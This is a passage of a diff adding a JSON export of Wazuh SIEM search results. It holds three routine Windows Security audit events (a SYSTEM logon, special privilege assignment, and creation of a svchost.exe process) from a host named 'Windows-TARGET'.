+                                "systemTime": "2026-05-12T16:25:20.6318456Z",
+                                "eventRecordID": "29663",
+                                "threadID": "876",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "12544",
+                                "processID": "824",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4624\",\"version\":\"3\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:20.6318456Z\",\"eventRecordID\":\"29663\",\"processID\":\"824\",\"threadID\":\"876\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t5\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tRemote Credential Guard:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tYes\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tSYSTEM\\r\\n\\tAccount Domain:\\t\\tNT AUTHORITY\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{00000000-0000-0000-0000-000000000000}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x324\\r\\n\\tProcess Name:\\t\\tC:\\\\Windows\\\\System32\\\\services.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\t-\\r\\n\\tSource Network Address:\\t-\\r\\n\\tSource Port:\\t\\t-\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tAdvapi  \\r\\n\\tAuthentication Package:\\tNegotiate\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"targetUserSid\":\"S-1-5-18\",\"targetUserName\":\"SYSTEM\",\"targetDomainName\":\"NT AUTHORITY\",\"targetLogonId\":\"0x3e7\",\"logonType\":\"5\",\"logonProcessName\":\"Advapi\",\"authenticationPackageName\":\"Negotiate\",\"logonGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"keyLength\":\"0\",\"processId\":\"0x324\",\"processName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\",\"impersonationLevel\":\"%%1833\",\"virtualAccount\":\"%%1843\",\"targetLinkedLogonId\":\"0x0\",\"elevatedToken\":\"%%1842\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:22.015Z",
+                    "location": "EventChannel",
+                    "id": "1778603122.3333295",
+                    "timestamp": "2026-05-12T16:25:22.015+0000"
+                },
+                "sort": [
+                    1778603122015
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "hhcBHZ4BTkZw-2445AOX",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "subjectUserSid": "S-1-5-18",
+                                "subjectDomainName": "NT AUTHORITY",
+                                "privilegeList": "SeAssignPrimaryTokenPrivilege     SeTcbPrivilege     SeSecurityPrivilege     SeTakeOwnershipPrivilege     SeLoadDriverPrivilege     SeBackupPrivilege     SeRestorePrivilege     SeDebugPrivilege     SeAuditPrivilege     SeSystemEnvironmentPrivilege     SeImpersonatePrivilege     SeDelegateSessionUserImpersonatePrivilege",
+                                "subjectUserName": "SYSTEM"
+                            },
+                            "system": {
+                                "eventID": "4672",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"Special privileges assigned to new logon.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E7\r\n\r\nPrivileges:\t\tSeAssignPrimaryTokenPrivilege\r\n\t\t\tSeTcbPrivilege\r\n\t\t\tSeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeAuditPrivilege\r\n\t\t\tSeSystemEnvironmentPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:25:20.6318849Z",
+                                "eventRecordID": "29664",
+                                "threadID": "876",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "12548",
+                                "processID": "824",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4672\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12548\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:20.6318849Z\",\"eventRecordID\":\"29664\",\"processID\":\"824\",\"threadID\":\"876\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"Special privileges assigned to new logon.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tSYSTEM\\r\\n\\tAccount Domain:\\t\\tNT AUTHORITY\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nPrivileges:\\t\\tSeAssignPrimaryTokenPrivilege\\r\\n\\t\\t\\tSeTcbPrivilege\\r\\n\\t\\t\\tSeSecurityPrivilege\\r\\n\\t\\t\\tSeTakeOwnershipPrivilege\\r\\n\\t\\t\\tSeLoadDriverPrivilege\\r\\n\\t\\t\\tSeBackupPrivilege\\r\\n\\t\\t\\tSeRestorePrivilege\\r\\n\\t\\t\\tSeDebugPrivilege\\r\\n\\t\\t\\tSeAuditPrivilege\\r\\n\\t\\t\\tSeSystemEnvironmentPrivilege\\r\\n\\t\\t\\tSeImpersonatePrivilege\\r\\n\\t\\t\\tSeDelegateSessionUserImpersonatePrivilege\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"SYSTEM\",\"subjectDomainName\":\"NT AUTHORITY\",\"subjectLogonId\":\"0x3e7\",\"privilegeList\":\"SeAssignPrimaryTokenPrivilege     SeTcbPrivilege     SeSecurityPrivilege     SeTakeOwnershipPrivilege     SeLoadDriverPrivilege     SeBackupPrivilege     SeRestorePrivilege     SeDebugPrivilege     SeAuditPrivilege     SeSystemEnvironmentPrivilege     SeImpersonatePrivilege     SeDelegateSessionUserImpersonatePrivilege\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:22.017Z",
+                    "location": "EventChannel",
+                    "id": "1778603122.3333295",
+                    "timestamp": "2026-05-12T16:25:22.017+0000"
+                },
+                "sort": [
+                    1778603122017
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "hxcBHZ4BTkZw-2445AOX",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\services.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x1d1c",
+                                "mandatoryLabel": "S-1-16-16384",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x324",
+                                "commandLine": "C:\\\\WINDOWS\\\\System32\\\\svchost.exe -k netsvcs",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1d1c\r\n\tNew Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-16384\r\n\tCreator Process ID:\t0x324\r\n\tCreator Process Name:\tC:\\Windows\\System32\\services.exe\r\n\tProcess Command Line:\tC:\\WINDOWS\\System32\\svchost.exe -k netsvcs\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:20.6366837Z",
+                                "eventRecordID": "29665",
+                                "threadID": "3764",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 106,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:20.6366837Z\",\"eventRecordID\":\"29665\",\"processID\":\"4\",\"threadID\":\"3764\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x1d1c\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-16384\\r\\n\\tCreator Process ID:\\t0x324\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\services.exe\\r\\n\\tProcess Command Line:\\tC:\\\\WINDOWS\\\\System32\\\\svchost.exe -k netsvcs\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x1d1c\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x324\",\"commandLine\":\"C:\\\\\\\\WINDOWS\\\\\\\\System32\\\\\\\\svchost.exe -k netsvcs\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\",\"mandatoryLabel\":\"S-1-16-16384\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:22.024Z",
+                    "location": "EventChannel",
+                    "id": "1778603122.3339343",
+                    "timestamp": "2026-05-12T16:25:22.024+0000"
+                },
+                "sort": [
+                    1778603122024
+                ]
+            }
+        ]
+    }
+}
